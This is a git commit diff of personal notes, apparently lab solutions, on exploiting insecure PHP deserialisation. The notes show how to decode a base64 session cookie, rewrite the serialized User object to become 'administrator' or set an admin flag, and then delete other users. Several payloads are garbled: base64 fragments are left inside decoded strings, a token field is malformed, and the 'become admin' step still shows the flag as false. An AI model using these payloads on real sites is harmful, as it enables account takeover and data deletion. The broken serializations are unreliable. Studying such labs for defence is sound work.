037ffd906dab3afa435a9378dba77d697b434386
Pranjal <pranjalruhela2811@gmail.com>
2023-07-04 23:17:39 +0530

    session cookie modification to be admin and delete users

---
+++ Insecure_Deserialisation/Modifying serialized data types/paylight.php
@@ -0,0 +1,9 @@
+<!-- 
+1) Get the serialised data object session cookie decoded from base64
+Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2Zzkxbjk3Ym1jdjc5bGU1Z2F5d3owOTJjZWo1YWw4eiI7fQ%3d%3d
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vg91n97bmcv79le5gaywz092cej5al8z";fQ%3d%3d
+
+2) Modify the username, the token and its corresponding details in the deserialised object
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:1:0;fQ%3d%3d
+
+ -->
--- Insecure_Deserialisation/Modifying serialized objects/payload.php
+++ Insecure_Deserialisation/Modifying serialized objects/payload.php
@@ -1,11 +1,12 @@
 <!-- 
 1) login as normal user to get the session cookie
-2) Base64 Decode the cookie
+2) URL decode then Base64 Decode the cookie data
     Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
-    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0O30%3d
-                                                             |||||| this portion might not mean anything for it seems curropt data.   
+    Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=
+    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
+                                                             
 3) Modify it to become admin and base64 encode it before supplying
-    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1O30%3d
+    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
     Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
     we can see the admin panel <a> now
 4) Delete some other user 
